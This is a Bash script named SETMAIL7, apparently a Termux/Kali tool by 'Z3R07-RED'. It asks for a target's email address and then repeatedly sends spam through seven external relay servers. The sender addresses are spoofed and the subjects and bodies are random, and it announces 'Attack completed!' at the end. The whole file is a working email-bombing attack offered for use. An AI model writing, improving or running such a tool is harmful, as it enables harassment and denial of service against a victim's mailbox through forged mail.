#!/bin/bash
#SETMAIL7
#Coded by Z3R07-RED on Feb 19 2021
#
#VARIABLES:
termux_path="/data/data/com.termux/files/usr/bin"
kali_linux_path="/usr/bin"
servers="CS07/vers"
ZEROAPT=""

source $servers

ServersList=("$server1" "$server2" "$server3" "$server4" "$server5" "$server6" "$server7")
SPINNER=('[V---]\e[0;36m\033[1m|' '[-i--]\e[0;36m\033[1m/' '[--R-]\e[0;36m\033[1m-' '[---u]\e[0;36m\033[1m\' '[--R-]\e[0;36m\033[1m|' '[-i--]\e[0;36m\033[1m/' '[V---]\e[0;36m\033[1m-' '[-i--]\e[0;36m\033[1m\' '[--R-]\e[0;36m\033[1m|' '[---u]\e[0;36m\033[1m/' '[--R-]\e[0;36m\033[1m-' '[-i--]\e[0;36m\033[1m\' '[V---]\e[0;36m\033[1m|' '[-i--]\e[0;36m\033[1m/' '[--R-]\e[0;36m\033[1m-' '[---u]\e[0;36m\033[1m\' '\033[0m\e[38;5;135m[-OK-]\e[0;32m\033[1m(✓)')

#universal_functions && universal_variables
if [[ -f "CS07/universal_functions" && -f "CS07/universal_variables" ]]; then
    source "CS07/universal_functions"
    source "CS07/universal_variables"
else
    echo -e "[ERROR]: \"universal_functions\", \"universal_variables\""
    echo "";exit 0
fi
#colors
if [[ -f "$colors" ]]; then
    source "$colors"
else
    unexpected_error
fi

#Directory
if [[ ! -d "$log_directory" ]]; then
	 mkdir $log_directory
fi

#Directory
if [[ ! -d "$tmp_directory" ]]; then
	 mkdir "$tmp_directory"
fi

#CTRL+C
trap ctrl_c INT

function ctrl_c(){
echo $(clear)
rm -rf tmp/* 2>/dev/null
rm -rf logs/* 2>/dev/null
echo -e "${LETTUCE}Program aborted.${W}"
tput cnorm
echo "";exit 1
}

#FUNCTIONS:
function ncurses_utils(){
if [ ! "$(command -v tput)" ]; then
	echo -e "\n${Y}[I]${W} apt install ncurses-utils ...${W}"
	apt install ncurses-utils -y > /dev/null 2>&1
	sleep 1
fi
}

# dependencies
function dependencies(){
if [[ -d "$termux_path" ]]; then
	ncurses_utils
    ZEROAPT="apt"
else
    ZEROAPT="apt-get"
fi

tput civis; counter_dn=0
echo $(clear);sleep 0.3

dependencies=(wget curl) # dependencies
for program in "${dependencies[@]}"; do
    if [ ! "$(command -v $program)" ]; then
        echo -e "\n${R}[X]${W}${C} $program${Y} is not installed.${W}"
        sleep 0.8
        echo -e "\n\e[1;33m[i]\e[0m${C} Installing ...${W}"
        $ZEROAPT install $program -y > /dev/null 2>&1
        echo -e "\n\e[1;32m[V]\e[0m${C} $program${Y} installed.${W}"
        sleep 1
        let counter_dn+=1
    fi
done

if [[ $counter_dn != 0 ]]; then
    echo -e "\n${C}$program_name${W}"
    echo -e "\n${G}Coded by $author on $making${W}"
    sleep 2; echo $(clear)
fi

tput cnorm
}

function send_spam_emails(){
NOMBRE=""
GNDC=$(randsetmaildata 5)
REMITENTE="club_secreto$GNDC@setmails.com"
DESTINATARIO="$CORREOOB"
ASUNTO=""
MENSAJE=""
if [[ "$listnu" == 1 ]]; then
    NOMBRE=$(randsetmaildata 10)
    ASUNTO="Club Secreto 07"
    if [[ -n "$MENSAJESPAM" ]]; then
        MENSAJE=$(cat "$tmp_directory/mensaje.tmp")
    else
        MENSAJE=$(randsetmaildata 2000)
    fi
else
    NOMBRE=$(randsetmaildata 12)
    ASUNTO=$(randsetmaildata 17)
    MENSAJE=$(randsetmaildata 1000)
fi
echo "DE  : $REMITENTE" > $tmp_directory/setmail_$NOMBRE.$listnu.txt 2>/dev/null
echo "PARA: $DESTINATARIO" >> $tmp_directory/setmail_$NOMBRE.$listnu.txt 2>/dev/null
echo "DATE: $(date)" >> $tmp_directory/setmail_$NOMBRE.$listnu.txt 2>/dev/null
base64 $tmp_directory/setmail_$NOMBRE.$listnu.txt > $log_directory/setmail_$NOMBRE.$listnu.log 2>/dev/null
rm -rf $tmp_directory/setmail_$NOMBRE.$listnu.txt 2>/dev/null
curl --data "nombre=$NOMBRE && remitente=$REMITENTE && destinatario=$DESTINATARIO && asunto=$ASUNTO && mensaje=$MENSAJE" $server
}


function setmail_start(){
let nuss=0
let sersn=0
let mailok=0
let mailno=0
let listnu=0
while :
do
    if [[ "$nuss" != 6 ]]; then
        let nuss=$(($nuss+1))
        for server in ${ServersList[@]};
        do
            let sersn=$(($sersn+1))
            if [[ "$listnu" != 6 ]]; then
                let listnu=$(($listnu+1))
            else
                let listnu=1
            fi
            echo -e "${RED_BC}Z3R07-RED${RESET} ${LEAD}Secret Club 07${RESET}"
            sleep 0.2
            echo -e "Service ($server) $(date)"
            sleep 3
            printf "${G}[*]${Y} [SERVER ]${W} ${G}[${C}%02d${G}]${W} - ${W}" $listnu
            printf "${C}EMAIL${W}${G} [${C}%02d${G}]${W}\n" $sersn
            sleep 0.3
            curl -I "$server" &> /dev/null
            if [[ $? -eq 0 ]]; then
                send_spam_emails
                let mailok=$(($mailok+1))
                for AnG in ${SPINNER[@]};
                do
                    printf "\r${G}[+]${LETTUCE} [SUCCESS]${W} ${G}[${C}%02d${G}]${W} ${W}${B}sending mail ${R}$AnG" $mailok
                    sleep 0.3
                done
                echo -e "\n${W}"
            else
                mailno=$(($mailno+1))
                printf "${R}[!]${M} [ ERROR ]${W} ${R}[${R}%02d${R}]${W} ${W}${B}sending mail ${M}[-NO-]${R}(X)${W}\n" $mailno
                sleep 1
                echo -e "${W}"
            fi
        done
    else
        break
    fi

done
echo -e "${G}[!] Attack completed!${W}"
tput cnorm
exit 0
}

function setmail_inputg(){
echo $(clear)
echo -e "${G}"
cat "CS07/banner/banner01"
echo -e "${W}"
echo -e "${Y}[*]${ORANGE} INGRESAR EL CORREO DEL OBJETIVO: ${W}"
while read -p "--- " CORREOOB && [ -z $CORREOOB ]; do
    printf "\n${R}--- Correo No Ingresado!${W}\n"
    echo ""
done
echo -e "${W}"
sleep 0.5
printf "${Y}[*]${Y}${ORANGE} QUIERE AGREGAR UN MENSAJE? [Y/N]->> ${W}"
while true; do
    read yn
    case $yn in
        [Yy]*)
            echo ""
            echo -e "${Y}[*]${ORANGE} INGRESAR MENSAJE: ${W}"
            read -p "--- " MENSAJESPAM
            echo "$MENSAJESPAM" > $tmp_directory/mensaje.tmp
            break
            ;;
        [Nn]*)
            break
            ;;
        *)
            break
            ;;
    esac
done
echo -e "${W}"; echo $(clear)
}

internet_connection
dependencies
setmail_inputg
tput civis
if [[ -f "CS07/banner/banner02" ]]; then
    echo -e "${R}"
    cat "CS07/banner/banner02"
    echo -e "${W}"
fi
setmail_start


